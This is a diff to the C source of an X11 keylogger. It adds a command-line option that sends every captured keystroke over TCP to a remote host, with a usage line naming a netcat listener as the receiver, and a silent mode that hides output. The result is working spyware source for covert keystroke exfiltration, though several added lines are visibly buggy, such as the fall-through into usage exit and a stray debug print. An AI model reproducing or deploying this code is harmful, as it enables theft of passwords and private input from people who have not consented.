@@ -10,17 +10,23 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <signal.h>    /* signal() */
-#include <unistd.h>    /* getopt() */
-#include <ctype.h>     /* toupper() */
+#include <signal.h>      /* signal() */
+#include <unistd.h>      /* getopt() */
+#include <ctype.h>       /* toupper() */
 
-#include <sys/types.h> /* time_t */
-#include <time.h>      /* time(), localtime(), asctime() */
+#include <sys/types.h>   /* time_t */
+#include <time.h>        /* time(), localtime(), asctime() */
+#include <sys/socket.h>  /* socket(), send() */
+#include <netinet/in.h>  /* inet datatypes */
+#include <netdb.h>
+#include <errno.h>
+#include <stdarg.h>      /* variable argument list */
 
 #include <X11/Xlib.h>
 #include <X11/X.h>
 
 #include "x11log.h"
+
 
 
 /* We only want to detect changed keyboard states, so we declare two keymap
@@ -33,6 +39,7 @@ static char keymap[2][XKBD_WIDTH],
 static FILE *output;
 static XModifierKeymap *map;
 static Display *dsp;
+static int silent;
 
 
 /* Here we go. */
@@ -43,6 +50,7 @@ int main (int argc, char ** argv) {
 
 	timestart = initialize(argc, argv, &opts);
 
+	silent = opts->silent;
 
 	/* NULL defaults to what is given in DISPLAY environment variable. However,
 	 * in some cases (e.g. within a VC) this variable is not set; so better go
@@ -51,6 +59,8 @@ int main (int argc, char ** argv) {
 	dsp = XOpenDisplay( (opts.display) ? opts.display : X_DEFAULT_DISPLAY );
 	if(!dsp)
 		fatal("Cannot open display");
+
+	log(1, "%s\n", "dd");
 
 	XSynchronize (dsp, True);
 	map = XGetModifierMapping(dsp);
@@ -67,6 +77,9 @@ int main (int argc, char ** argv) {
 			if(getbit(kbd, i) != getbit(tmp, i) && getbit(kbd, i)) {
 				fprintf(output, "%s", (char*)decodeKey(i, getbit(kbd, i), getMods(kbd)));
 				fflush(output);
+
+				if(opts.log_remote)
+					transmit_keystroke_inet((char*)decodeKey(i, getbit(kbd, i), getMods(kbd)), &opts);
 			}
 	}
 }
@@ -87,9 +100,14 @@ struct tm* initialize(int argc, char ** argv, struct opts_struct* opts) {
 	/* set default values for cmdline options */
 	opts->display = X_DEFAULT_DISPLAY;
 	opts->logfile = NULL;
+	opts->silent = 0;
+	opts->log_remote = 0;
+	opts->remote_addr = NULL;
+	opts->host = NULL;
+	opts->port = 0;
 
 	/* parse cmdline arguments */
-	while((c = getopt(argc, argv, "d:f:h?")) != -1){
+	while((c = getopt(argc, argv, "d:f:h?r:s")) != -1){
 		switch(c) {
 			case 'd':
 				opts->display = optarg;
@@ -97,12 +115,21 @@ struct tm* initialize(int argc, char ** argv, struct opts_struct* opts) {
 			case 'f':
 				opts->logfile = optarg;
 				break;
+			case 'r':
+				opts->remote_addr = optarg;
+				opts->log_remote = 1;
+				break;
+			case 's':
+				opts->silent = 1;
 			case 'h':
 			case '?':
 				fprintf(stderr, " usage: %s [OPTION]\n", argv[0]);
 				fprintf(stderr, " Available options:\n");
 				fprintf(stderr, "\t-d <DISPLAY>   X-Display to use, default is :0.0\n");
 				fprintf(stderr, "\t-f <LOGFILE>   Log keystrokes to file instead of STDOUT. Text is appended; creates file if necessary.\n");
+				fprintf(stderr, "\t-r <HOST:PORT> Log keystrokes to remote host. The other end needs a listening daemon on given port\n\t\t\t(e.g. using netcat: 'nc -p <port> -k')\n");
+				fprintf(stderr, "\t-s             Be silent (no stdout).\n");
+
 				exit(EXIT_FAILURE);
 			default:
 				break;
@@ -121,6 +148,20 @@ struct tm* initialize(int argc, char ** argv, struct opts_struct* opts) {
 			output = stdout;
 		}
 	}
+
+	/* remote logging argument validation */
+	if((opts->remote_addr != NULL)
+		&& (strstr(opts->remote_addr, ":") != NULL) && opts->log_remote) {
+
+		opts->host = strtok(opts->remote_addr, ":");
+		opts->port = atol( strtok(NULL, ":") );
+
+		if(opts->port <= 0 || opts->port > 65535)
+			fatal("Invalid tcp port number");
+	} else {
+		fatal("Illegal argument for remote logging");
+	}
+
 
 	/* just for logging */
 	rawtime = time(NULL);
@@ -233,4 +274,47 @@ void fatal(const char * msg){
 	if(msg != NULL)
 		fprintf(stderr, "Fatal: %s.\n", msg);
 	exit(EXIT_FAILURE);
+}
+
+/**
+ * transmit keystroke to a remote host, where a daemon in listening mode
+ * is required to be running. The connection is established upon every
+ * keystroke, which is inefficient, but causes less problems; permanent
+ * connection should be tested here.
+ * */
+int transmit_keystroke_inet(char* key, struct opts_struct *opts){
+	int sock, bytes_sent;
+	struct hostent *host;
+	struct sockaddr_in server_addr;
+
+	host = gethostbyname( opts->host );
+	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
+		return ERR_SOCKET;
+
+	server_addr.sin_family = AF_INET;
+	server_addr.sin_port = htons( opts->port );
+	server_addr.sin_addr = *((struct in_addr *)host->h_addr);
+	bzero(&(server_addr.sin_zero),8);
+
+	if(connect(sock,
+			(struct sockaddr*)&server_addr, sizeof(struct sockaddr)) == -1)
+		return ERR_CONNECT;
+
+	bytes_sent = send(sock, key, strlen(key), 0);
+	close(sock);
+
+	return bytes_sent;
+}
+
+/**
+ * printf() wrapper, taking care of debug levels
+ * */
+void log(int level, const char *fmt, ...) {
+	if(silent)
+		return;
+
+	va_list args;
+	va_start(args, fmt);
+	vfprintf(stdout, fmt, args);
+	va_end(args);
 }
